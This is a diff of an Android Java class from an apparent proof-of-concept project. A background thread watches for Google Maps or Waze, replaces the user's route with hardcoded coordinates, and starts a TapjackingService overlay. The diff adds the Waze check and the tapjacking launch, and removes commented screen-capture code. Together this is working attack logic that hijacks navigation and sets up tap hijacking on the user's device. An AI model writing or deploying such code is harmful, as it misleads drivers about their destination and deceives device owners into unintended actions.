@@ -28,11 +28,12 @@ import static com.test.www.navigationtest.MainActivity.*;
 /**
  * Created by Dodobal-2 on 5/8/2016.
  */
+
 class ListenActivity extends Thread{
     boolean exit = false;
     ActivityManager am = null;
     Context context = null;
-
+    public static int flag=0;
     public ListenActivity(Context con){
         context = con;
         am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
@@ -46,44 +47,18 @@ class ListenActivity extends Thread{
             List<AndroidAppProcess> processes = ProcessManager.getRunningAppProcesses();
             for (AndroidAppProcess process:processes) {
                 String pkgName = process.getPackageName();
-                if (pkgName.contains("map")){
-                    Toast.makeText(context, "Google Maps is running", Toast.LENGTH_LONG).show();
+                if (pkgName.contains("map") || pkgName.contains("waze")){
+                    Toast.makeText(context, "Google Maps or waze is running", Toast.LENGTH_LONG).show();
                     Log.d("aaa","pkgname  " + pkgName);
-                    
+                    //Intent intent=new Intent(Intent.ACTION_VIEW, Uri.parse("http://maps.google.com/maps?saddr=35.6895,139.6917&daddr=35.6896,139.6921")); //Japan
                     Intent intent=new Intent(Intent.ACTION_VIEW, Uri.parse("http://maps.google.com/maps?saddr=52.3702,4.8952&daddr=52.3703,4.8955")); //Nether
                     context.startActivity(intent);
+                    context.startService(new Intent(TapjackingService.class.getName()));
 
-//                    Date now = new Date();
-//                    android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);
-//
-//                    try {
-//                        // image naming and path  to include sd card  appending name you choose for file
-//                        String mPath = Environment.getExternalStorageDirectory().toString() + "/" + now + ".jpg";
-//
-//                        // create bitmap screen capture
-//                        View v1 = getWindow().getDecorView().getRootView();
-//                        v1.setDrawingCacheEnabled(true);
-//                        Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
-//                        v1.setDrawingCacheEnabled(false);
-//
-//                        File imageFile = new File(mPath);
-//
-//                        FileOutputStream outputStream = new FileOutputStream(imageFile);
-//                        int quality = 100;
-//                        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
-//                        outputStream.flush();
-//                        outputStream.close();
-//                    } catch (Throwable e) {
-//                        // Several error may come out with file handling or OOM
-//                        e.printStackTrace();
-//                    }
+
+                    flag=1;
                     exit=true;
                 }
-//                if (pkgName.contains("waze")) {
-//                    Toast.makeText(context, "Waze is running", Toast.LENGTH_LONG).show();
-//                    Log.d("aaa", "pkgname  " + pkgName);
-//                    exit=true;
-//                }
             }
         }
         Looper.loop();
